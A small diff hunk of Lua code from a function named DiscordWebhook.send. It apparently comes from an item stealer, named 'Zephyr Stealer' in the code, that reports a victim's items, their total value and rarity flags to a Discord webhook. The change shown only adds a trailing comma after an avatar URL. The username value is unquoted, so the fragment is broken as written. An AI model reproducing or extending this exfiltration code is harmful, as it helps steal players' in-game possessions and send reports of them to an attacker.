@@ -476,7 +476,7 @@ function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorit
         ["content"] = contentMsg,
         ["username"] = Zephyr Stealer,
         ["embeds"] = {embed},
-        ["avatar_url"] = "https://i.postimg.cc/85rWVH87/file-00000000feb861f5b33ef5b7b42b6598.png"
+        ["avatar_url"] = "https://i.postimg.cc/85rWVH87/file-00000000feb861f5b33ef5b7b42b6598.png",
     }
     
     pcall(function()
